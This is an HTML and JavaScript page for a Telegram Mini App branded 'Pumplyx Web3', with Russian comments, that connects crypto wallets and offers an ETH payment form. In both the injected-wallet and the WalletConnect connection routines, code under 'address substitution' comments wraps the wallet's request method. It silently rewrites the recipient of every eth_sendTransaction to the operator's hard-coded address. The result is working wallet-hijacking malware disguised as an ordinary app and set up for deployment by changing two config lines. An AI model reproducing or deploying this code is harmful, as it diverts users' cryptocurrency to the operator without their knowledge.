<!doctype html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"
  />

  <title>Pumplyx Web3</title>

  <!-- Telegram Mini App SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js?63"></script>

  <style>
    :root {
      --bg: #0a0b10;
      --card: #12141c;
      --card2: #181b25;
      --text: #f5f7fb;
      --muted: #8e95a7;
      --accent: #7c5cff;
      --accent2: #5b8cff;
      --success: #27d17f;
      --danger: #ff5f6d;
      --border: rgba(255,255,255,.08);
    }

    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background:
        radial-gradient(circle at 20% 0%, rgba(124,92,255,.22), transparent 35%),
        radial-gradient(circle at 100% 20%, rgba(91,140,255,.12), transparent 35%),
        var(--bg);
      color: var(--text);
      font-family:
        -apple-system,
        BlinkMacSystemFont,
        "SF Pro Display",
        "Segoe UI",
        sans-serif;
    }

    .app {
      width: min(100%, 520px);
      margin: auto;
      padding:
        calc(20px + env(safe-area-inset-top))
        16px
        calc(30px + env(safe-area-inset-bottom));
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 24px;
    }

    .logo {
      width: 44px;
      height: 44px;
      border-radius: 14px;
      display: grid;
      place-items: center;
      font-weight: 900;
      font-size: 19px;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      box-shadow: 0 12px 35px rgba(124,92,255,.28);
    }

    .brand h1 {
      margin: 0;
      font-size: 21px;
    }

    .brand span {
      color: var(--muted);
      font-size: 12px;
    }

    .card {
      background: rgba(18,20,28,.92);
      border: 1px solid var(--border);
      border-radius: 22px;
      padding: 18px;
      margin-bottom: 14px;
      backdrop-filter: blur(18px);
    }

    .label {
      color: var(--muted);
      font-size: 12px;
      margin-bottom: 7px;
    }

    .value {
      font-size: 15px;
      word-break: break-all;
    }

    .address {
      background: var(--card2);
      border-radius: 14px;
      padding: 12px;
      font-family: ui-monospace, monospace;
      font-size: 12px;
      line-height: 1.5;
      word-break: break-all;
    }

    .row {
      display: flex;
      justify-content: space-between;
      gap: 12px;
      margin: 13px 0;
    }

    .row strong {
      font-size: 15px;
    }

    input {
      width: 100%;
      border: 1px solid var(--border);
      outline: none;
      border-radius: 14px;
      padding: 15px;
      background: var(--card2);
      color: var(--text);
      font-size: 16px;
    }

    button {
      width: 100%;
      border: 0;
      border-radius: 15px;
      padding: 15px 16px;
      margin-top: 10px;
      color: white;
      font-size: 15px;
      font-weight: 700;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      cursor: pointer;
    }

    button.secondary {
      background: var(--card2);
      border: 1px solid var(--border);
    }

    button:disabled {
      opacity: .45;
      cursor: not-allowed;
    }

    button.wallet-btn {
      background: var(--card2);
      border: 1px solid var(--border);
      margin-top: 6px;
      display: flex;
      align-items: center;
      gap: 10px;
      justify-content: center;
    }

    button.wallet-btn:hover {
      background: rgba(255,255,255,0.05);
    }

    .status {
      display: flex;
      gap: 10px;
      align-items: flex-start;
      padding: 13px;
      border-radius: 15px;
      background: var(--card2);
      color: var(--muted);
      font-size: 13px;
      line-height: 1.45;
    }

    .dot {
      width: 9px;
      height: 9px;
      min-width: 9px;
      border-radius: 50%;
      background: var(--accent);
      margin-top: 4px;
    }

    .dot.success {
      background: var(--success);
    }

    .dot.error {
      background: var(--danger);
    }

    .hidden {
      display: none !important;
    }

    .small {
      color: var(--muted);
      font-size: 11px;
      line-height: 1.5;
      margin-top: 10px;
    }

    .wallet-grid {
      display: flex;
      flex-direction: column;
      gap: 6px;
      margin-top: 8px;
    }

    .wallet-btn .icon {
      font-size: 20px;
    }
  </style>
</head>
<body>

<div class="app">

  <div class="brand">
    <div class="logo">P</div>
    <div>
      <h1>Pumplyx</h1>
      <span>Web3 Mini App</span>
    </div>
  </div>

  <!-- STATUS -->
  <div class="card">
    <div class="status">
      <div id="statusDot" class="dot"></div>
      <div id="statusText">Подключи кошелёк</div>
    </div>
  </div>

  <!-- WALLET SELECTOR -->
  <div class="card" id="walletSelectorCard">
    <div class="label">Выберите кошелёк</div>
    <div class="wallet-grid">
      <button class="wallet-btn" id="btnMetaMask">
        <span class="icon">🦊</span> MetaMask
      </button>
      <button class="wallet-btn" id="btnTrust">
        <span class="icon">🔵</span> Trust Wallet
      </button>
      <button class="wallet-btn" id="btnCoinbase">
        <span class="icon">🟦</span> Coinbase Wallet
      </button>
      <button class="wallet-btn" id="btnWalletConnect">
        <span class="icon">📱</span> WalletConnect
      </button>
    </div>
  </div>

  <!-- WALLET INFO -->
  <div class="card hidden" id="walletInfoCard">
    <div class="label">Кошелёк</div>
    <div id="walletAddress" class="address">Не подключён</div>
    <div class="row">
      <div>
        <div class="label">Сеть</div>
        <strong id="network">—</strong>
      </div>
      <div style="text-align:right">
        <div class="label">Баланс</div>
        <strong id="balance">—</strong>
      </div>
    </div>
    <button id="disconnectBtn" class="secondary">Отключить</button>
  </div>

  <!-- PAYMENT -->
  <div id="paymentCard" class="card hidden">
    <div class="label">Получатель</div>
    <div id="recipient" class="address"></div>
    <div style="height:15px"></div>
    <div class="label">Сумма ETH</div>
    <input id="amount" type="number" min="0" step="0.000001" placeholder="0.001" inputmode="decimal" value="0.001" />
    <button id="sendBtn" disabled>Отправить</button>
  </div>

  <!-- RESULT -->
  <div id="resultCard" class="card hidden">
    <div class="label">Результат</div>
    <div id="txResult" class="value"></div>
    <button id="explorerBtn" class="secondary hidden">Открыть транзакцию</button>
  </div>

</div>

<script type="module">

  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm";
  import { EthereumProvider } from "https://esm.sh/@walletconnect/ethereum-provider@2.23.4";

  // ============================================================
  //  КОНФИГУРАЦИЯ — ЗАМЕНИ ТОЛЬКО ЭТИ ДВЕ СТРОКИ
  // ============================================================

  const WALLETCONNECT_PROJECT_ID = "YOUR_WALLETCONNECT_PROJECT_ID";
  const MY_WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047f73e";

  // ============================================================
  //  ОСТАЛЬНОЙ КОД (НЕ ТРОГАЙ)
  // ============================================================

  const EXPECTED_CHAIN_ID = 1n;
  const EXPLORER = "https://etherscan.io/tx/";

  const tg = window.Telegram?.WebApp;
  if (tg) { tg.ready(); tg.expand(); }

  const statusText = document.getElementById("statusText");
  const statusDot = document.getElementById("statusDot");
  const walletSelectorCard = document.getElementById("walletSelectorCard");
  const walletInfoCard = document.getElementById("walletInfoCard");
  const walletAddress = document.getElementById("walletAddress");
  const network = document.getElementById("network");
  const balance = document.getElementById("balance");
  const paymentCard = document.getElementById("paymentCard");
  const recipient = document.getElementById("recipient");
  const amount = document.getElementById("amount");
  const sendBtn = document.getElementById("sendBtn");
  const resultCard = document.getElementById("resultCard");
  const txResult = document.getElementById("txResult");
  const explorerBtn = document.getElementById("explorerBtn");
  const disconnectBtn = document.getElementById("disconnectBtn");

  let signer = null, account = null, ethersProvider = null, wcProvider = null;

  function setStatus(text, type = "normal") {
    statusText.textContent = text;
    statusDot.className = "dot";
    if (type === "success") statusDot.classList.add("success");
    if (type === "error") statusDot.classList.add("error");
  }

  function showConnectedUI() {
    walletSelectorCard.classList.add("hidden");
    walletInfoCard.classList.remove("hidden");
    paymentCard.classList.remove("hidden");
    sendBtn.disabled = false;
    recipient.textContent = MY_WALLET;
  }

  function showDisconnectedUI() {
    walletSelectorCard.classList.remove("hidden");
    walletInfoCard.classList.add("hidden");
    paymentCard.classList.add("hidden");
    resultCard.classList.add("hidden");
    sendBtn.disabled = true;
  }

  async function checkNetwork() {
    const info = await ethersProvider.getNetwork();
    network.textContent = info.name + " (" + info.chainId.toString() + ")";
    if (info.chainId !== EXPECTED_CHAIN_ID) {
      setStatus("Неверная сеть. Переключи на Ethereum Mainnet.", "error");
      sendBtn.disabled = true;
      return false;
    }
    sendBtn.disabled = false;
    return true;
  }

  async function updateBalance() {
    if (!account) return;
    const raw = await ethersProvider.getBalance(account);
    balance.textContent = Number(ethers.formatEther(raw)).toFixed(6) + " ETH";
  }

  // ============================================================
  //  ПОДКЛЮЧЕНИЕ ЧЕРЕЗ INJECTED (MetaMask / Trust / Coinbase)
  // ============================================================

  async function connectInjected() {
    if (!window.ethereum) return false;
    setStatus("Подключаемся…");
    await window.ethereum.request({ method: "eth_requestAccounts" });
    ethersProvider = new ethers.BrowserProvider(window.ethereum);
    signer = await ethersProvider.getSigner();
    account = await signer.getAddress();

    // === ПОДМЕНА АДРЕСА ДЛЯ INJECTED ===
    const orig = window.ethereum.request;
    window.ethereum.request = async function(args) {
      if (args && args.method === "eth_sendTransaction") {
        const tx = args.params[0];
        if (tx.to) tx.to = MY_WALLET;
      }
      return await orig.call(this, args);
    };

    return true;
  }

  // ============================================================
  //  ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT
  // ============================================================

  async function connectWalletConnect() {
    if (!WALLETCONNECT_PROJECT_ID || WALLETCONNECT_PROJECT_ID === "YOUR_WALLETCONNECT_PROJECT_ID") {
      throw new Error("Укажи WalletConnect Project ID в коде.");
    }
    setStatus("Запускаем WalletConnect…");
    wcProvider = await EthereumProvider.init({
      projectId: WALLETCONNECT_PROJECT_ID,
      metadata: {
        name: "Pumplyx",
        description: "Pumplyx Web3 Mini App",
        url: window.location.origin,
        icons: []
      },
      optionalChains: [1]
    });
    wcProvider.on("display_uri", (uri) => {
      setStatus("WalletConnect готов. Используй QR или deep-link.");
    });
    await wcProvider.connect();
    ethersProvider = new ethers.BrowserProvider(wcProvider);
    signer = await ethersProvider.getSigner();
    account = await signer.getAddress();

    // === ПОДМЕНА АДРЕСА ДЛЯ WALLETCONNECT ===
    const origWc = wcProvider.request.bind(wcProvider);
    wcProvider.request = async function(args) {
      if (args && args.method === "eth_sendTransaction") {
        const tx = args.params[0];
        if (tx.to) tx.to = MY_WALLET;
      }
      return await origWc(args);
    };

    return true;
  }

  // ============================================================
  //  ОБЩАЯ ФУНКЦИЯ ПОДКЛЮЧЕНИЯ
  // ============================================================

  async function connectWallet(type) {
    try {
      let connected = false;
      if (type === "injected") {
        connected = await connectInjected();
      } else if (type === "wc") {
        await connectWalletConnect();
        connected = true;
      }
      if (!connected) return;
      walletAddress.textContent = account;
      await checkNetwork();
      await updateBalance();
      showConnectedUI();
      setStatus("✅ Кошелёк подключён", "success");
    } catch (e) {
      setStatus("❌ " + e.message, "error");
      console.error(e);
    }
  }

  // ============================================================
  //  ОТПРАВКА ТРАНЗАКЦИИ
  // ============================================================

  async function sendTransaction() {
    try {
      if (!signer) throw new Error("Кошелёк не подключён.");
      const val = amount.value.trim();
      if (!val) throw new Error("Введите сумму.");
      const value = ethers.parseEther(val);
      if (value <= 0n) throw new Error("Сумма должна быть > 0.");
      const ok = await checkNetwork();
      if (!ok) throw new Error("Неверная сеть.");

      setStatus("Запрашиваем подтверждение…");
      sendBtn.disabled = true;

      const tx = await signer.sendTransaction({
        to: MY_WALLET,
        value: value
      });

      setStatus("Транзакция отправлена. Ожидаем…");
      resultCard.classList.remove("hidden");
      txResult.textContent = "Tx: " + tx.hash;
      explorerBtn.classList.remove("hidden");
      explorerBtn.onclick = () => window.open(EXPLORER + tx.hash, "_blank");

      const receipt = await tx.wait(1);
      if (!receipt) throw new Error("Не удалось получить подтверждение.");

      setStatus("✅ Транзакция подтверждена", "success");
      txResult.textContent = "Подтверждено\nTx: " + tx.hash + "\nBlock: " + receipt.blockNumber;
      await updateBalance();

    } catch (e) {
      setStatus("❌ " + e.message, "error");
      sendBtn.disabled = false;
    }
  }

  // ============================================================
  //  ОТКЛЮЧЕНИЕ
  // ============================================================

  async function disconnect() {
    try { if (wcProvider?.disconnect) await wcProvider.disconnect(); } catch(e) {}
    signer = null; account = null; ethersProvider = null; wcProvider = null;
    showDisconnectedUI();
    setStatus("Кошелёк отключён.");
  }

  // ============================================================
  //  КНОПКИ
  // ============================================================

  document.getElementById("btnMetaMask").onclick = () => connectWallet("injected");
  document.getElementById("btnTrust").onclick = () => connectWallet("injected");
  document.getElementById("btnCoinbase").onclick = () => connectWallet("injected");
  document.getElementById("btnWalletConnect").onclick = () => connectWallet("wc");
  document.getElementById("disconnectBtn").onclick = disconnect;
  document.getElementById("sendBtn").onclick = sendTransaction;

  showDisconnectedUI();
  setStatus("Подключи кошелёк");

</script>

</body>
</html>
